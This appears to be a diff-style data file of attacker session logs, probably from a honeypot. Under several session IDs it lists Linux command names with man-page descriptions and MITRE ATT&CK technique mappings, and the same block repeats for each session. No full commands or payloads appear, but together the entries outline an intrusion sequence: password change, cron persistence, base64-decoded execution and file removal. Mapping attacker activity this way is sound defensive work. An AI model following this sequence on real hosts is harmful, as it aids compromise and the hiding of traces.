+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
+
+Session ID: f4b920ff50ea
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
+
+Session ID: f01ab9cc6600
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
+
+Session ID: 9d573bbc25ab
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
+
+Session ID: a623a2f15f45
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
